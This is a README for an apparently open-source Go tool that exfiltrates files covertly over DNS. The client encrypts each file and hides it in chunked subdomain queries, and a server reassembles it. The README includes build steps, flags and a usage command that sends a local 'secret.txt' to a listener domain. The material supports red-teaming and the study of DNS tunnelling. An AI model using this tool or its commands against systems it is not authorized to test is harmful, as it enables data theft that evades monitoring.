# DNS Exfiltration Tool (Go)

This repository contains a DNS exfiltration toolkit written in Go. It allows encrypted, chunked file exfiltration over DNS by encoding file contents with AES-GCM and Base32, transmitting data as DNS A queries, and reassembling the payload on the server side.

> ⚠️ **Educational Use Only**  
> This project is for research, learning, and red-teaming exercises on systems you own or are explicitly authorized to test. Misuse may violate laws or acceptable use policies.

---

## 🧩 Overview

- **Client**: Reads and encrypts a file using AES-GCM, Base32 encodes the payload, splits it into DNS-safe chunks, and sends each chunk as a subdomain in a DNS query.
- **Server**: Listens for DNS queries, extracts and reassembles chunked payloads by identifier, decodes and decrypts the data, and saves the original file to disk.

---

## 🔐 Encryption

- **AES-GCM 256-bit** (32-byte key from `EXFIL_KEY` environment variable)
- Nonce is generated per transfer and prepended to ciphertext
- Encrypted blob is encoded using **unpadded Base32**

---

## 📦 Features

- Chunked transmission via DNS A queries (RFC-compliant labels ≤ 63 chars)
- Reliable reassembly and timeout cleanup on server
- Automatic retransmission for failed client chunks
- Logging for all stages of transmission and recovery

---

## 🚀 Usage

### 1. Generate a 256-bit AES key

```bash
head -c 32 /dev/urandom | xxd -p -c 32
```

Add to `.env` file:

```env
EXFIL_KEY=<your 64-character hex key>
```

---

### 2. Build the binaries

```bash
go build -o dnsexfil-client ./client
go build -o dnsexfil-server ./server
```

---

### 3. Run the server

```bash
./dnsexfil-server --port 5300 --domain xf.example.com --output-dir ./output
```

> The server listens for DNS queries on UDP port 5300 and writes decoded files to `./output`.

---

### 4. Run the client

```bash
./dnsexfil-client --server-ip 127.0.0.1 --server-port 5300 --file-path ./secret.txt --domain xf.example.com
```

> The client encrypts and sends the file over DNS. Failed chunks are retried.

---

## ⚙️ CLI Flags

### Server

| Flag           | Default                   | Description                            |
|----------------|---------------------------|----------------------------------------|
| `--port`       | `53`                      | UDP port to listen on                  |
| `--domain`     | `xf.example.com`          | Domain suffix to match                 |
| `--output-dir` | `./output`                | Output directory for recovered files   |
| `--low`        | `100`                     | Min response delay (ms)                |
| `--high`       | `1500`                    | Max response delay (ms)                |

### Client

| Flag             | Default            | Description                              |
|------------------|--------------------|------------------------------------------|
| `--server-ip`     | `127.0.0.1`        | DNS server IP                            |
| `--server-port`   | `5300`             | DNS server port                          |
| `--file-path`     | *(required)*       | Path to file to exfiltrate               |
| `--domain`        | `xf.example.com`   | Domain suffix for DNS queries            |

---

## 📁 Project Structure

```
.
├── client/
│   └── main.go       # Client logic
├── server/
│   └── main.go       # Server logic
├── .env              # Contains EXFIL_KEY
└── README.md
```

---

## 📜 Legal Notice

This tool is provided **as-is**, without any guarantees or warranty.  
By using this code, you agree to use it only on systems for which you have explicit permission to test.  
The authors accept no liability for misuse or damage.

---

## 🧠 Credit

Created by [John Burns](https://github.com/johnburns)  
Inspired by prior implementations in Python, now ported for speed and portability in Go.
